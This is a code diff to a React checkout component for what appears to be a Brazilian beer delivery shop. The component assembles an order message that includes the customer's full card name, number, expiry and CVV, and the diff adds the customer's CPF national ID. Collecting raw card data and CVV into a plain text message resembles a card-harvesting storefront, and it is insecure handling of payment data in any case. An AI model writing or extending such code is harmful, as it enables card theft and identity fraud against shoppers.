@@ -173,7 +173,7 @@ const Checkout = () => {
 
       const cardText =
         payment === "credit"
-          ? `\n\n💳 DADOS DO CARTÃO\nNome: ${card.name}\nNúmero: ${card.number}\nValidade: ${card.expiry}\nCVV: ${card.cvv}`
+          ? `\n\n💳 DADOS DO CARTÃO\nNome: ${card.name}\nCPF: ${card.cpf}\nNúmero: ${card.number}\nValidade: ${card.expiry}\nCVV: ${card.cvv}`
           : "";
 
       const message = `🍺 NOVO PEDIDO\n\n📍 ENDEREÇO\n${addressText}\n\n💳 PAGAMENTO: ${payment === "pix" ? "PIX" : "Crédito"}${cardText}\n\n📦 ITENS\n${itemsText}\n\nSubtotal: R$ ${totalPrice.toFixed(2).replace(".", ",")}\nTaxa de entrega: R$ ${deliveryFee.toFixed(2).replace(".", ",")}\nTotal: R$ ${total.toFixed(2).replace(".", ",")}`;
